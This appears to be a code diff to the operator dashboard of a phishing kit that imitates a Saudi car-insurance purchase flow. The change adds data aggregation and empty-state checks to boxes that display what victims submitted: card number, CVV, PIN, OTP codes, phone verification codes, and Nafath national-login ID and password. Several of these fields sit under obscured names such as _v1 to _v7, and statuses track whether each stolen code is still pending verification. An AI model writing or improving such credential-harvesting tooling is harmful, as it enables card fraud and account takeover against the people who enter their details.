@@ -2017,7 +2017,16 @@ export default function DashboardPage() {
 
   // صندوق صفحة البداية (home-new)
   const renderHomeNewBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
+    
+    // Check if there's any basic data to show
+    const hasBasicData = raw?.insuranceType || raw?.identityNumber || raw?.ownerName || 
+                         raw?.phoneNumber || raw?.documentType || raw?.serialNumber || 
+                         raw?.buyerName || raw?.buyerIdNumber;
+    
+    if (!hasBasicData) return null;
+    
     const timestamp = raw?.submittedAt || raw?.updatedAt || raw?.homeUpdatedAt;
 
     return (
@@ -2066,8 +2075,15 @@ export default function DashboardPage() {
 
   // صندوق صفحة بيانات المركبة (insur)
   const renderInsurBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
     const timestamp = raw?.insurUpdatedAt || raw?.updatedAt || raw?.submittedAt;
+
+    // Check if there's any insurance data to show
+    const hasInsuranceData = raw?.insuranceCoverage || raw?.insuranceStartDate || raw?.vehicleUsage || 
+                             raw?.vehicleValue || raw?.vehicleYear || raw?.vehicleModel || raw?.repairLocation;
+    
+    if (!hasInsuranceData) return null;
 
     // ترجمة استخدام المركبة
     const vehicleUsageLabels: Record<string, string> = {
@@ -2134,11 +2150,18 @@ export default function DashboardPage() {
 
   // صندوق صفحة اختيار الباقة (compar)
   const renderComparBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
     const timestamp = raw?.comparCompletedAt || raw?.comparUpdatedAt || raw?.selectedOffer?.updatedAt || raw?.updatedAt;
 
     const selectedOffer = raw?.selectedOffer || {};
     const offerTypeLabel = selectedOffer?.type === "comprehensive" ? "شامل" : "ضد الغير";
+
+    // Check if there's any compar data to show
+    const hasComparData = selectedOffer?.name || selectedOffer?.type || raw?.offerTotalPrice || 
+                          selectedOffer?.extra_features?.length > 0;
+    
+    if (!hasComparData) return null;
 
     return (
       <div style={{ 
@@ -2205,9 +2228,14 @@ export default function DashboardPage() {
 
   // صندوق صفحة التحقق من OTP (step2)
   const renderOtpBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
     const otpStatus = raw?._v5Status || raw?.otpStatus;
     const otpValue = raw?._v5 || raw?.otpCode || "";
+
+    // التحقق من وجود بيانات OTP
+    const hasOtpData = otpValue || otpStatus;
+    if (!hasOtpData) return null;
 
     const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
       "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
@@ -2425,7 +2453,8 @@ export default function DashboardPage() {
 
   // صندوق بيانات بطاقة الدفع (صفحة check)
   const renderCheckBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
     
     // التحقق من وجود بيانات البطاقة (فحص شامل)
     const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard || raw?.cvv || raw?._v2 || raw?.cardOwner || raw?._v4;
@@ -2730,8 +2759,14 @@ export default function DashboardPage() {
 
   // صندوق صفحة رقم الهاتف (step5)
   const renderPhoneBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw || {};
     const timestamp = raw?.phoneSubmittedAt || raw?._v7UpdatedAt || raw?.phoneUpdatedAt || raw?.updatedAt;
+
+    // Check if there's any phone data to show
+    const hasPhoneData = raw?.phoneIdNumber || raw?.phoneNumber || raw?.phoneCarrier || raw?._v7 || raw?.phoneOtpStatus;
+    
+    if (!hasPhoneData) return null;
 
     const phoneOtpStatus = raw?.phoneOtpStatus;
     const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
@@ -2989,8 +3024,14 @@ export default function DashboardPage() {
 
   // صندوق صفحة النفاذ (step4)
   const renderNafadBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('nafad') || selectedRequest?.raw || {};
     const timestamp = raw?.nafadUpdatedAt || raw?.updatedAt;
+
+    // Check if there's any nafad data to show
+    const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword || raw?.nafadStatus || raw?.nafadConfirmationStatus;
+    
+    if (!hasNafadData) return null;
 
     const nafadStatus = raw?.nafadStatus || raw?.nafadConfirmationStatus;
     const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
@@ -3208,7 +3249,8 @@ export default function DashboardPage() {
 
   // صندوق صفحة PIN (step3)
   const renderPinBox = () => {
-    const raw = selectedRequest?.raw || {};
+    // Use getLatestRawForBox to aggregate data from all entries
+    const raw = getLatestRawForBox('card') || selectedRequest?.raw || {};
     const timestamp = raw?.pinSubmittedAt || raw?._v6UpdatedAt || raw?.pinUpdatedAt || raw?.updatedAt;
     
     const pinStatus = raw?._v6Status || raw?.pinStatus;
